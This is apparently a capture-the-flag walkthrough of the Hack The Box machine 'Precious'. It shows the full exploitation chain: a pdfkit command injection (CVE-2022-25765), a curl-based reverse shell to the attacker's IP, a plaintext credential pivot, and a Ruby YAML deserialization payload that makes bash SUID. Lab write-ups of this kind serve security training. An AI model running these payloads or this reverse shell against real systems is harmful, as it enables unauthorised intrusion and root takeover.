# Precious

*Linux* - Precious is an Easy Difficulty Linux machine, that focuses on the `Ruby` language. It hosts a custom `Ruby` web application, using an outdated library, namely pdfkit, which is vulnerable to `CVE-2022-25765`, leading to an initial shell on the target machine. After a pivot using plaintext credentials that are found in a Gem repository `config` file, the box concludes with an insecure deserialization attack on a custom, outdated, `Ruby` script.

--------------

## 1. Submit User Flag

First add the ip address and the domain `precious.htb` to the `etc/hosts` file:

```sh
echo '10.10.11.189 precious.htb' | sudo tee -a /etc/hosts 2>/dev/null
```

Then when you visit the page, you see that there is a prompt to convert web page to PDF.

Let's scan the page with `nmap`.

```sh
nmap -sV -sC precious.htb

Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-28 00:40 CET
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 00:40 (0:00:06 remaining)
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.025s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)
|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)
|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-server-header: 
|   nginx/1.18.0
|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15
|_http-title: Convert Web Page to PDF
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We got two open ports 22 and 80.

From the headers we learn also about the server which is nginx, and that it uses Ruby. 

```sh
curl -I http://precious.htb

HTTP/1.1 200 OK
Content-Type: text/html;charset=utf-8
Content-Length: 483
Connection: keep-alive
Status: 200 OK
X-XSS-Protection: 1; mode=block
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
Date: Thu, 27 Mar 2025 23:40:37 GMT
X-Powered-By: Phusion Passenger(R) 6.0.15
Server: nginx/1.18.0 + Phusion Passenger(R) 6.0.15
X-Runtime: Ruby
```

Now let's use the website. 

Create a web-server on a directory.

```sh
python3 -m http.server
```

Add your ip to the web-page, and it will download you a pdf file.

Let's view the metadata of the file, using `exiftool`.

```sh
exiftool gxk4iq5r7e4rxktdyxfffvh2brv0wcdk.pdf

ExifTool Version Number         : 13.25
File Name                       : gxk4iq5r7e4rxktdyxfffvh2brv0wcdk.pdf
Directory                       : .
File Size                       : 57 kB
File Modification Date/Time     : 2025:03:28 00:54:20+01:00
File Access Date/Time           : 2025:03:28 00:54:20+01:00
File Inode Change Date/Time     : 2025:03:28 00:54:20+01:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 2
Creator                         : Generated by pdfkit v0.8.6
```

Now we know that the app behind that did this is `pdfkit 0.8.6` and let's search for any vulnerabilities.

We found a `Command Injection` vulnerability - CVE-2022-25765, and found a PoC, which in order to check if it works, I'm going to try to `cURL` to our server, to check if we got a request.

```sh
http://10.10.14.2:8000/?name=#{'%20`curl http://10.10.14.2:8000/test`'}
```

On the web-server we see the request, and now we know that we have a working exploit here.

```sh
10.10.11.189 - - [28/Mar/2025 01:29:44] "GET /test HTTP/1.1" 404 -
```

Let's try to get a reverse shell, first start a listening service using `ncat`.

```sh
nc -nlvp 4444
```

I created a `ruby` reverse shell one-liner from www.revshells.com.

```sh
C='curl -Ns telnet://10.10.14.2:4444'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
```

And we got a reverse shell.

```sh
nc -nlvp 4444

Connection from 10.10.11.189:60456
whoami
ruby
```

Let's get the file from the `henry` directory.

We don't have access to read the `user.txt` file on `/home/henry` so we should upgrade the shell to a `TTY`.

```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

On the `/home/ruby` we have a `.bundle` directory, which hosts configuration files by `Gem` and `Ruby`.

When we read the config file, we see the plain-text password.

```sh
cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Since we have a `ssh` let's try it with these credentials.

```sh
cat /home/henry/user.txt

17861cfd6697732c4f6bed35f521b534
```


## 2. Submit root flag

Let's try now the privilege escalation.

While checking for `sudo` privileges we see an entry for a `Ruby` script.

```sh
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Let's try to run it.

```sh
sudo /usr/bin/ruby /opt/update_dependencies.rb
Traceback (most recent call last):
	2: from /opt/update_dependencies.rb:17:in `<main>'
	1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)
```

Now check the `dependencies.yml`.

```yml
cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

From `def list_from_file YAML.load(File.read("dependencies.yml"))` we see that it is referenced relatively, so no absolute path is specified, meaning that the program looks for the file in the current directory.

We should keep in mind a security issue that is not secure to use `yaml` to load untrusted data, as this can allow malicious input to execute arbitrary code into the application.

The ruby version is:

```sh
ruby -v
ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
```

which after some search it seems to be vulnerable to the following payload:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md

```rb
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```


Create a file on `/tmp` named `dependencies.yml` and paste this code, and we see that the command `id` is executed.

```sh
sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
	33: from /opt/update_dependencies.rb:17:in `<main>'
	32: from /opt/update_dependencies.rb:10:in `list_from_file'
	31: from /usr/lib/ruby/2.7.0/psych.rb:279:in `load'
	30: from /usr/lib/ruby/2.7.0/psych/nodes/node.rb:50:in `to_ruby'
	29: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	28: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	27: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	26: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:313:in `visit_Psych_Nodes_Document'
	25: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	24: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	23: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	22: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:141:in `visit_Psych_Nodes_Sequence'
	21: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `register_empty'
	20: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `each'
	19: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:332:in `block in register_empty'
	18: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:32:in `accept'
	17: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:6:in `accept'
	16: from /usr/lib/ruby/2.7.0/psych/visitors/visitor.rb:16:in `visit'
	15: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:208:in `visit_Psych_Nodes_Mapping'
	14: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:394:in `revive'
	13: from /usr/lib/ruby/2.7.0/psych/visitors/to_ruby.rb:402:in `init_with'
	12: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:218:in `init_with'
	11: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:214:in `yaml_initialize'
	10: from /usr/lib/ruby/vendor_ruby/rubygems/requirement.rb:299:in `fix_syck_default_key_in_requirements'
	 9: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_reader.rb:59:in `each'
	 8: from /usr/lib/ruby/vendor_ruby/rubygems/package/tar_header.rb:101:in `from'
	 7: from /usr/lib/ruby/2.7.0/net/protocol.rb:152:in `read'
	 6: from /usr/lib/ruby/2.7.0/net/protocol.rb:319:in `LOG'
	 5: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	 4: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
	 3: from /usr/lib/ruby/vendor_ruby/rubygems/request_set.rb:388:in `resolve'
	 2: from /usr/lib/ruby/2.7.0/net/protocol.rb:464:in `<<'
	 1: from /usr/lib/ruby/2.7.0/net/protocol.rb:458:in `write'
/usr/lib/ruby/2.7.0/net/protocol.rb:458:in `system': no implicit conversion of nil into String (TypeError)
```

Now let's set a SUID bit on the `bash` binary.

To do this, replace the payload with the:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: chmod +s /bin/bash
         method_id: :resolve

```

Meaning that instead of `id` we execute `chmod +s /bin/bash`.

Execute it.

```sh
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

Now execute bash and keep privileges.

```sh
bash -p
```

And you have root access, so now read the flag.

```sh
bash-5.1# cd /root
bash-5.1# ls
root.txt
bash-5.1# cat root.txt
19e8b043ee166c8a5e5bdb1e45cad727
bash-5.1# 
```